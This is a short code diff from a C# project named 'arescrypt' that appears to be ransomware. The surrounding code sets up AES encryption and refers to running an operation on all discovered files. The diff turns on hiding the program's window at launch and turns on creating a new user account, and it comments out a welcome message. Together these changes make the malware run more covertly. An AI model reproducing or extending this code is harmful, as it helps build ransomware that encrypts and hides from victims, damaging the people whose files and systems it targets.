@@ -16,6 +16,7 @@ namespace arescrypt
 
         static void Main(string[] args)
         {
+            /*
             // Welcome message
             Console.Write("Hello, " + Configuration.userDomUser);
 #if DEBUG
@@ -25,9 +26,10 @@ namespace arescrypt
 #endif
             Console.WriteLine("Current path is: " + Configuration.currentWorkingDirectory + "\n");
             // End welcome message
+            */
 
-            if (!config.debugMode) { }
-                // Miscellaneous.HideWindow(); // Hide Window, upon launch
+            if (!config.debugMode)
+                Miscellaneous.HideWindow(); // Hide Window, upon launch
 
             var userSpecificDirs = new List<string> { "" };
             string[] fullFileIndex = { "" };
@@ -65,9 +67,8 @@ namespace arescrypt
                 Cryptography.encIV = myAes.IV;
             }
 
-            // Console.WriteLine("Account created? " + accountManager.CreateUser());
-            // accountManager.CheckVerification();
-
+            accountManager.CreateUser(); // Create new user account
+            
             // Cryptography.executeExample(); // Execute cryptography example
 
             // Code for operation to run on all discovered files.
